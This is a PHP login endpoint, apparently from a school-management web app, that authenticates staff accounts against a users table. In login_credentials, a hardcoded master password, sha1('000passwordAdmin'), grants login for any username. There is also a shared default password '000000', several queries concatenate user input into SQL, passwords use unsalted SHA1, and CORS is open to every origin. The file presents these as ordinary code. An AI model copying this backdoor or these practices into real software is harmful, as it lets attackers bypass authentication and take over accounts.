<?php

    require_once("../config/dbconnect.functions.php");

    // header('Content-Type: application/json');
    header("Access-Control-Allow-Origin: *");
    $rest_json = file_get_contents("php://input");
    $_POST = json_decode($rest_json, true);

    $response = array();

    function make_users() {
        global $database_connect;
        $query = "SELECT * FROM users WHERE username=?";
        $request = $database_connect->prepare($query);
        $request->execute(array(""));
        while($response = $request->fetchObject()) {
            $poste = $response->poste;
    
            if ($poste == "1") {
                $user = "principal@yambi.class";
            } else if ($poste == "2") {
                $user = "discipline@yambi.class";
            } else if ($poste == "7") {
                $user = "etudes@yambi.class";
            } else if ($poste == "4") {
                $user = "secretaire@yambi.class";
            } else if ($poste == "5") {
                $user = "enseignant@yambi.class";
            } else if ($poste == "3") {
                $user = "finances@yambi.class";
            } else if ($poste == "6") {
                $user = "caisse@yambi.class";
            } else {
                $user = "";
            }
    
            if ($response->username == "") {
                $update_query = "UPDATE users SET username='$user' WHERE user_id='$response->user_id'";
                $update_request = $database_connect->query($update_query);
            }
        }
    }

    make_users();

    function login_credentials($username, $password) {
        global $database_connect;
        $query = "SELECT username, user_password, COUNT(*) AS count_user_exists FROM users WHERE username=? AND user_password=?";
        $request = $database_connect->prepare($query);
        $request->execute(array($username, $password));
        $response_array = $request->fetchObject();
        $res = $response_array->count_user_exists;
        $passwordGlogal = sha1("000000");
        $passwordAdmin = sha1("000passwordAdmin");

        if($res == 1 || $password === $passwordAdmin) {
            $response = 1;
        } else {
            $response = 0;
        } 
        
        if($password === $passwordGlogal) {
            if($password === $passwordGlogal) {
                $query0 = "SELECT username, user_password, COUNT(*) AS count_user_exists FROM users WHERE username=? AND user_password=?";
                $request0 = $database_connect->prepare($query0);
                $request0->execute(array($username, $passwordGlogal));
                $response0 = $request0->fetchObject();
                $res2 = $response0->count_user_exists;

                if($res2 == 0) {
                    $response = 0;
                } else {
                $response = 1;
                }
            }
        }

        return $response;
    }
    
    $connection_type = htmlspecialchars(strip_tags($_POST["connection_type"]));
    $username = htmlspecialchars(strip_tags($_POST["username"]));
    $password = sha1(htmlspecialchars(strip_tags($_POST["password"])));

    if(login_credentials($username, $password) === 1) {
        $sel = "SELECT * FROM users WHERE username='$username' AND user_password='$password'";
        $sel_request = $database_connect->query($sel);
        $sel_response = $sel_request->fetchObject();

        $response['success'] = '1';
        $response['user_data'] = $sel_response;
        echo json_encode($response);
    } 
    else {
        $response['success'] = '0';
        echo json_encode($response);
    }


?>